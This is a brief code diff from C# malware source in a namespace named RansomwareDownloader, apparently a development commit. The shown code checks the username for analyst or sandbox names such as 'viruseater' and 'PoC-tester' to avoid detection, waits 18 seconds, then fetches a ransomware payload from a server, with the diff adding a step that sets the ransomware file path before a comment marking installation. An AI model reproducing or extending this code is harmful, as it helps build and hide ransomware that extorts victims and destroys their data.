@@ -22,6 +22,7 @@ namespace RansomwareDownloader
             if (Environment.UserName.Contains("viruseater")) return;
             if (Environment.UserName.Contains("PoC-tester")) return;
             Thread.Sleep(18000);
+            serverCommunicator.setRansomwareFilePath();
             serverCommunicator.getQuickRansomware();
             Thread.Sleep(2000);
             //Install ransomware
